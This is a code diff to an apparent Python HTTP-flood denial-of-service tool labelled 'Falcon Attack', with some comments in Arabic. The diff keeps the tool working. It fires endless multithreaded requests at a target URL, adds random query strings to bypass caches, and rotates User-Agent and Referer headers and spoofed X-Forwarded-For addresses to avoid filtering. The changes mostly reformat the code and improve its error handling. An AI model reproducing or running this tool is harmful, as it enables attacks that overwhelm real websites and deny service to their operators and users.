@@ -2,10 +2,10 @@ import urllib.request
 import concurrent.futures
 import random
 import re
-import sys, os
+import sys
+import os
 from colorama import Fore
 import threading
-import string
 from halo import Halo
 from logo import logo
 from ipFake import random_ipFake
@@ -29,29 +29,35 @@ def inc_counter():
     global request_counter
     request_counter += 1
 
+
 def set_flag(val):
     global flag
     flag = val
+
 
 def set_safe():
     global safe
     safe = 1
 
+
 def referer_list():
     global headers_referers
     with open('Tools/ref.txt', 'r') as file:
         data = file.readlines()
-        headers_referers = random.sample([item.strip() for item in data], 2)
+        headers_referers = [item.strip() for item in data if item.strip()]  # تأكد من إزالة أي فراغات إضافية
     return headers_referers
 
+
 def buildblock(size):
-    return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))
+    return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(size))
+
 
 def usage():
     spinner = Halo()
     spinner.succeed(f'Method : {__method__}.')
     spinner.stop()
-    print('-'*40)
+    print('-' * 40)
+
 
 def httpcall(url):
     code = 0
@@ -59,38 +65,43 @@ def httpcall(url):
         param_joiner = "&"
     else:
         param_joiner = "?"
-    payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
+    payload = buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     request_url = url + param_joiner + payload
     headers = {
-    'User-Agent': random.choice(uagent),
-    'Cache-Control': 'no-cache',
-    'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
-    'Accept-Charset': 'iso-8859-1,utf-8;q=0.7,*;q=0.7',
-    'Referer': random.choice(referer_list()),
-    'Keep-Alive': str(random.randint(120, 130)),
-    'Connection': 'keep-alive',
-    'Host': host,
-    'X-Forwarded-For': random_ipFake()
-}
+        'User-Agent': random.choice(uagent),
+        'Cache-Control': 'no-cache',
+        'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+        'Accept-Charset': 'iso-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Referer': random.choice(referer_list()),
+        'Keep-Alive': str(random.randint(120, 130)),
+        'Connection': 'keep-alive',
+        'Host': host,
+        'X-Forwarded-For': random_ipFake()
+    }
 
     try:
-        urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
+        # إرسال الطلب
+        req = urllib.request.Request(request_url, headers=headers)
+        urllib.request.urlopen(req)
     except urllib.error.HTTPError as e:
         set_flag(1)
-        print(f"{Fore.RED}[ 500 ] {Fore.MAGENTA} Response Code !")
-        code = 500
+        print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} Response Code !")
+        code = e.code
     except urllib.error.URLError as e:
+        print(f"{Fore.RED}Error: {e.reason}")
         sys.exit()
     else:
         inc_counter()
 
     return code
 
+
 def http_caller(url):
     while flag < 2:
         code = httpcall(url)
         if code == 500 and safe == 1:
             pass
+
 
 def monitor_thread():
     sent = 0
@@ -102,6 +113,7 @@ def monitor_thread():
             previous = request_counter
     if flag == 2:
         print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")
+
 
 if __name__ == "__main__":
     os.system('clear')
@@ -131,7 +143,10 @@ if __name__ == "__main__":
 
             # Waiting for all tasks to complete
             for future in concurrent.futures.as_completed(future_to_url):
-                future.result()
+                try:
+                    future.result()
+                except Exception as e:
+                    print(f"Error in thread execution: {e}")
 
             # Waiting for the monitor thread to finish
             t.join()
